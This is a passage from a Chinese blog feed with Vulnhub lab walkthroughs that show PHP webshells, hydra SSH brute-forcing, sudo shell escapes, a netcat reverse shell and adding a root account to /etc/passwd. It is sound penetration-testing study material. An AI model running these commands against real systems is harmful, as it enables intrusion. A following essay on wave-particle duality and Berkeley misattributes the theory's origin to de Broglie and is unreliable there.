pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/18.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root mysql -e &#39;\! &#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/19.png" alt="" /></p><hr /><blockquote><p>ProFRPd 1.3.5 mod_copy</p></blockquote><p>该模块允许未授权用户进行任意文件拷贝操作，配合SMB访问以及已知SMB路径即可完成任意文件下载/上传操作<br />该模块也存在写入Webshell的操作，具体操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://blog.barradell-johns.com/index.php/2019/08/25/symfonos-two-writeup/">WalkThrough</a><br /><a href="https://www.exploit-db.com/exploits/37262">写入WebShell</a></p></blockquote><hr /><h1 id="fishymail"><a class="markdownIt-Anchor" href="#fishymail"></a> <a href="https://www.vulnhub.com/entry/fishymail-1,583/">FishyMail</a></h1><p><code>2020/11/04 20:52:24</code></p><h2 id="寻找靶机ip-20"><a class="markdownIt-Anchor" href="#寻找靶机ip-20"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/00.png" alt="" /></p><h2 id="端口扫描-36"><a class="markdownIt-Anchor" href="#端口扫描-36"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/01.png" alt="" /></p><h2 id="web路径扫描-19"><a class="markdownIt-Anchor" href="#web路径扫描-19"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.103/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/02.png" alt="" /></p><h2 id="漏洞利用-36"><a class="markdownIt-Anchor" href="#漏洞利用-36"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.103:8080/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;spongebob</span><br><span class="line">&#x2F;dataentry</span><br><span class="line">&#x2F;fishymailer</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/04.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/05.png" alt="" /></p><p>继续枚举目录 <code>/dataentry/</code> 下的路劲</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/06.png" alt="" /></p><p>枚举目录 <code>/dataentry/backup/admin/files/</code> 下的文件</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/07.png" alt="" /></p><p>访问 <code>http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/08.png" alt="" /></p><p>对内容进行解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/09.png" alt="" /></p><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat words1</span><br><span class="line">spongebob</span><br><span class="line">Sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">chocolateflavoredWATER</span><br><span class="line">dirtysalmon </span><br><span class="line">chinook</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">pearl</span><br><span class="line">krabs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/10.png" alt="" /></p><p>使用 <code>squidward</code> 账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh squidward@192.168.1.103 -p 2600</span><br><span class="line">0ctopus</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/11.png" alt="" /></p><h2 id="权限提升-36"><a class="markdownIt-Anchor" href="#权限提升-36"></a> 权限提升</h2><p>查看信息<br /><code>cat /BikiniBottom-db.sql</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/12.png" alt="" /></p><p>进行Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/13.png" alt="" /></p><p>在线MD5解密</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/14.png" alt="" /></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spongebob:sandy</span><br><span class="line">squidward:0ctopus</span><br><span class="line">patrick:</span><br><span class="line">dirtysalmon:crabby4eva</span><br><span class="line">Sandy:astronaut</span><br></pre></td></tr></table></figure><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat words2</span><br><span class="line">spongebob</span><br><span class="line">sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">dirtysalmon</span><br><span class="line">crabby4eva</span><br><span class="line">Sandy</span><br><span class="line">astronaut</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/15.png" alt="" /></p><p>使用账户 <code>dirtysalmon</code> 登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh dirtysalmon@192.168.1.103 -p 2600</span><br><span class="line">crabby4eva</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">OpenBSD fishymail.Home 6.6 GENERIC#353 amd64</span><br></pre></td></tr></table></figure><p>搜索相关提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openbsd 6</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/16.png" alt="" /></p><p>进行提权操作</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/17.png" alt="" /></p><hr /><blockquote><p>ksh</p></blockquote><p>squidward账户受到了ksh的限制，很多命令无法执行，尝试过切换成/bin/sh，但是无法实现</p><p>参考资料</p><blockquote><p><a href="https://grumpygeekwrites.wordpress.com/2020/10/27/fishymail-1-vulnhub-walk-through/">WalkThrough</a></p></blockquote><hr /><h1 id="hemisphere-lynx"><a class="markdownIt-Anchor" href="#hemisphere-lynx"></a> <a href="https://www.vulnhub.com/entry/hemisphere-lynx,577/">Hemisphere: Lynx</a></h1><p><code>2020/11/06 23:22:46</code></p><h2 id="寻找靶机ip-21"><a class="markdownIt-Anchor" href="#寻找靶机ip-21"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/00.png" alt="" /></p><h2 id="端口扫描-37"><a class="markdownIt-Anchor" href="#端口扫描-37"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/01.png" alt="" /></p><h2 id="web路径扫描-20"><a class="markdownIt-Anchor" href="#web路径扫描-20"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.104/</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/02.png" alt="" /></p><h2 id="漏洞利用-37"><a class="markdownIt-Anchor" href="#漏洞利用-37"></a> 漏洞利用</h2><p>枚举smb服务相关信息<br /><code>enum4linux 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/03.png" alt="" /></p><p>得到用户名 <code>johannes</code></p><p>访问 <code>http://192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/04.png" alt="" /></p><p>获取网站文本内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass</span><br></pre></td></tr></table></figure><p>进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.56.104   login: johannes   password: constelaciones</span><br></pre></td></tr></table></figure><p>得到账户 <code>johannes:constelaciones</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh johannes@192.168.56.104</span><br><span class="line">constelaciones</span><br></pre></td></tr></table></figure><h2 id="权限提升-37"><a class="markdownIt-Anchor" href="#权限提升-37"></a> 权限提升</h2><p>查看桌面保存的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds </span><br><span class="line">MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d</span><br><span class="line">20Kl7iS1KCaniO8DWMzh:toor</span><br></pre></td></tr></table></figure><p>逆序输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;</span><br><span class="line">root:hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><p>切换到root用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><hr /><h1 id="colddbox-easy"><a class="markdownIt-Anchor" href="#colddbox-easy"></a> <a href="https://www.vulnhub.com/entry/colddbox-easy,586/">ColddBox: Easy</a></h1><p><code>2020/11/06 13:06:15</code></p><h2 id="寻找靶机ip-22"><a class="markdownIt-Anchor" href="#寻找靶机ip-22"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/00.png" alt="" /></p><h2 id="端口扫描-38"><a class="markdownIt-Anchor" href="#端口扫描-38"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/01.png" alt="" /></p><h2 id="web路径扫描-21"><a class="markdownIt-Anchor" href="#web路径扫描-21"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.106/</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/02.png" alt="" /></p><h2 id="漏洞利用-38"><a class="markdownIt-Anchor" href="#漏洞利用-38"></a> 漏洞利用</h2><p>使用wpscan进行用户名枚举</p><p><code>wpscan --url http://192.168.56.106 -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/03.png" alt="" /></p><p>使用wpscan进行账户爆破</p><p><code>wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/04.png" alt="" /></p><p>使用账户 <code>c0ldd:9876543210</code> 进行登入<br /><code>http://192.168.56.106/wp-login.php</code></p><p>登入之后进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Appearance -&gt; Editor -&gt; 404.php</span><br></pre></td></tr></table></figure><p>插入PHPShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p>验证Shell<br />访问 <code>http://192.168.56.106/?p=2&amp;cmd=whoami</code> ，得到回显 <code>www-data</code></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>反弹Shell<br />访问<br /><code>http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff</code></p><h2 id="权限提升-38"><a class="markdownIt-Anchor" href="#权限提升-38"></a> 权限提升</h2><p>查看数据库配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/05.png" alt="" /></p><p>得到数据库账户 <code>c0ldd:cybersecurity</code></p><p>尝试使用该账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh c0ldd@192.168.56.106</span><br><span class="line">cybersecurity</span><br></pre></td></tr></table></figure><p>登入成功</p><p>查看SUDO权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/07.png" alt="" /></p><p>生成Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.</span><br></pre></td></tr></table></figure><p>以root身份修改文件 <code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>插入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>切换至账户 <code>test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>即可获得root权限</p><hr /><p>参考资料</p><blockquote><p><a href="https://sevenlayers.com/index.php/377-vulnhub-colddbox-easy-walkthrough">WalkThrough</a></p></blockquote><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>光的波粒二象性理论与存在即被感知理论的联系分析</title>
    <link href="https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/"/>
    <id>https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/</id>
    <published>2023-02-07T03:18:30.000Z</published>
    <updated>2023-02-07T16:52:17.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><h3 id="光的波粒二象性理论与存在即被感知理论概述"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论概述"></a> 光的波粒二象性理论与存在即被感知理论概述</h3><p>光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。</p><h3 id="研究目的及意义"><a class="markdownIt-Anchor" href="#研究目的及意义"></a> 研究目的及意义</h3><p>本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。</p><p>这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。</p><p>除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。</p><a id="more"></a><h2 id="光的波粒二象性理论"><a class="markdownIt-Anchor" href="#光的波粒二象性理论"></a> 光的波粒二象性理论</h2><h3 id="理论的历史发展"><a class="markdownIt-Anchor" href="#理论的历史发展"></a> 理论的历史发展</h3><p>光的波粒二象性理论最早由路易斯·德布罗意(Louis de Broglie)在20世纪初提出。该理论是作为对光的波模型和粒子模型之间长期争论的回应而发展起来的，这种争论自从发现光本身以来就一直存在。粒子模型首先发展起来，艾萨克·牛顿爵士提出光是由粒子组成的，而波动模型是后来发展起来的，克里斯蒂安·惠更斯和托马斯·杨提出光是一种波。</p><p>光的波粒二象性理论是理解光的本质的重大突破，解决了光的波粒模型之间长期存在的争论。该理论认为，光可以表现出波状和粒子状行为，具体取决于观察方式。著名的双缝实验进一步证实了这一理论，该实验表明光在通过两个狭缝时可以表现出波状干涉图案，但在被检测到时也可以表现出粒子状行为。</p><h3 id="理论基础和原理"><a class="markdownIt-Anchor" href="#理论基础和原理"></a> 理论基础和原理</h3><p>光的波粒二象性理论的理论基础植根于量子力学。在量子力学中，粒子被描述为波函数，它们的行为由波粒二象性描述。该理论假定粒子的行为取决于它们被观察的方式，并且它们可以表现出波状或粒子状行为，这取决于它们被检测到的方式。</p><p>光的波粒二象性理论基于叠加的概念，即一个粒子可以同时以多种状态存在。这个想法与经典物理学相反，经典物理学假设粒子以确定的状态存在，并且可以确定地预测它们的行为。在量子力学中，粒子被描述为概率波，它们的行为只能根据概率来预测。</p><h3 id="实验证据和论证"><a class="markdownIt-Anchor" href="#实验证据和论证"></a> 实验证据和论证</h3><p>光的波粒二象性理论已在大量实验中得到证实。其中最著名的是双缝实验，该实验由托马斯·杨(Thomas Young)于19世纪初首先进行。在这个实验中，光通过两个狭缝，在狭缝后面的屏幕上观察到由此产生的干涉图样。干涉图案表明光表现为波，波峰和波谷相互干涉以产生图案。</p><p>另一个证明光的波粒二象性理论的实验是光电效应。在这个实验中，光照射在金属表面上，电子从表面发射出来。检测到电子，发现它们的行为类似于粒子。这个实验表明，光可以表现出波状和粒子状两种行为，这取决于它是如何被观察到的。</p><p>这些实验以及其他许多实验为光的波粒二象性理论提供了有力的证据，并证实了其有效性。该理论一直是量子力学发展的核心，并已被纳入物理和工程的众多领域，包括电信和计算。光的波粒二象性理论仍然是物理学中最重要和最广泛研究的理论之一，其含义至今仍在继续探索和理解。</p><h2 id="存在即被感知理论"><a class="markdownIt-Anchor" href="#存在即被感知理论"></a> 存在即被感知理论</h2><p>存在即被感知理论认为，观察者感知对象和事件的方式决定了它们的真实性。换句话说，物体或事件的真实性取决于观察者及其对它的感知。这一理论植根于几千年前的哲学和宗教传统，但最著名的阐述是在 18 世纪初的哲学家乔治·伯克利(George Berkeley)。</p><p>伯克利对这一理论的论证基于这样一种观点，即存在的一切都必须以某种方式被感知。根据伯克利的说法，物体只存在于观察者的脑海中，而体验它们存在的唯一方式是通过感知。从这个意义上说，现实完全是主观的，客观世界是心灵创造的幻觉。</p><p>存在即被感知理论遭到了批评和支持，一些人认为它是对现实主观性的有力论证，而另一些人则认为它有缺陷且不合逻辑。然而，无论其哲学有效性如何，该理论在几个世纪以来一直被广泛讨论和争论，并对西方思想的发展产生了重大影响。</p><h3 id="与光的波粒二象性理论的比较"><a class="markdownIt-Anchor" href="#与光的波粒二象性理论的比较"></a> 与光的波粒二象性理论的比较</h3><p>光的波粒二象性理论和存在即被感知理论是相关的，因为它们都证明了物体的性质取决于观察方式。在光的波粒二象性理论的情况下，光的波状和粒子状特性取决于用于测量它们的观察方法。同样，在存在即被感知理论中，物体的真实性取决于观察者的感知。</p><p>然而，这两种理论之间存在重要差异。虽然光的波粒二象性理论已被实验证实并被科学界广泛接受，但存在即被感知理论更具争议性并受到批评。此外，光的波粒二象性理论为光的本质及其行为方式提供了具体的解释，而存在即被感知理论为现实的本质提供了更普遍的哲学解释。</p><h3 id="对理解现实本质的影响"><a class="markdownIt-Anchor" href="#对理解现实本质的影响"></a> 对理解现实本质的影响</h3><p>光的波粒二象性理论和存在即被感知理论都对我们对现实的理解具有重要意义。光的波粒二象性理论表明，物体的性质可能取决于观察它的方式，而客观世界可能并不总是它看起来的样子。这导致了对光的性质和量子世界的新思考方式，并且是量子力学发展的主要贡献者。</p><p>另一方面，存在即被感知理论暗示现实完全是主观的，客观世界是心灵创造的幻觉。虽然这个想法可能看起来很激进，但它已经引发了关于现实本质的重要问题，并激发了对感知、现实和心灵之间关系的进一步哲学探究。</p><p>总而言之，虽然光的波粒二象性理论与存在即被感知理论存在重要差异，但它们之间存在联系，因为它们证明了物体的性质取决于观察方式。这些理论对我们理解现实具有重要意义，并且它们仍然是科学家、哲学家和寻求更好地了解周围世界的个人的重要研究领域。</p><h2 id="两种理论之间的联系"><a class="markdownIt-Anchor" href="#两种理论之间的联系"></a> 两种理论之间的联系</h2><h3 id="光的波粒二象性理论与存在即被感知理论的关系分析"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论的关系分析"></a> 光的波粒二象性理论与存在即被感知理论的关系分析</h3><p>光的波粒二象性理论和存在即被感知理论是两个看似截然不同的理论，但在探索现实本质的过程中却有着共同点。这两种理论都试图理解被观察者与观察者之间的关系，以及这种关系如何塑造我们对周围世界的理解。光的波粒二象性理论表明，光如何根据观察方式表现出波和粒子的特性，而存在即被感知理论断言，我们所经历的现实是由我们感知它的方式塑造的。</p><p>光的波粒二象性理论源于早期的光和物质实验，例如双缝实验。这个实验表明，当光以波的形式被观察到时，它可以穿过两个狭缝，并在狭缝后面的屏幕上产生干涉图样。然而，当光以粒子的形式被观察时，它一次只通过一个狭缝，并没有产生干涉图样。这个实验表明，光的性质会随着观察方式的不同而发生变化。</p><p>同样，存在即被感知理论表明我们对现实的理解是由我们感知它的方式决定的。该理论断言，我们所经历的世界不是独立于我们的感知而存在的客观现实，而是由我们的感知和与世界的相互作用所创造的主观现实。从这个意义上说，我们所经历的现实是我们思想以及我们如何处理来自周围世界的信息的产物。</p><h3 id="讨论联系对我们理解现实的影响"><a class="markdownIt-Anchor" href="#讨论联系对我们理解现实的影响"></a> 讨论联系对我们理解现实的影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义。它表明现实的本质可能比我们之前想象的更加复杂和难以捉摸。光的波粒二象性理论表明，光的特性可以根据观察方式而改变，而存在即被感知理论表明，我们体验到的现实是由我们感知它的方式塑造的。</p><p>这些理论共同表明，我们对现实的理解可能会受到我们观察和感知周围世界的方式的限制。这对科学研究具有重要意义，因为它表明我们的实验和测量可能会受到我们观察和感知世界的方式的限制。这也对我们理解主观体验以及感知在塑造我们的现实中所起的作用有影响。</p><h3 id="探索对其他研究领域的可能联系和影响"><a class="markdownIt-Anchor" href="#探索对其他研究领域的可能联系和影响"></a> 探索对其他研究领域的可能联系和影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系也对其他研究领域具有潜在影响。例如，它可能对量子物理学领域有影响，该领域与理解亚原子粒子的行为有关。光的波粒二象性理论和存在即被感知理论都表明，我们对现实的理解可能会受到我们观察和感知世界的方式的影响，这可能对我们对量子世界的理解产生影响。</p><p>此外，这两种理论之间的联系可能对心理学领域和知觉研究产生影响。存在即被感知理论表明，我们的感知在塑造我们的现实中起着重要作用，这可能对我们理解感知如何影响我们的行为和思维过程有影响。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义，并有可能影响许多研究领域。对这种联系的进一步研究可能会提供对现实本质的更深入见解，并帮助我们更好地理解观察和感知在塑造我们对周围世界的理解方面所起的作用。</p><p>值得注意的是，这些理论仍处于发展的早期阶段，关于光的波粒二象性理论与存在即被感知理论之间的联系，仍有许多有待探索和理解。然而，这种联系的潜在影响是令人兴奋的，并且有可能以深刻的方式塑造我们对现实的理解。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系是一个复杂而有趣的研究领域，对我们对现实的理解具有重要意义。对这种联系的进一步研究有可能揭示现实的本质以及它是如何通过观察和感知形成的。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><h3 id="主要发现和结论总结"><a class="markdownIt-Anchor" href="#主要发现和结论总结"></a> 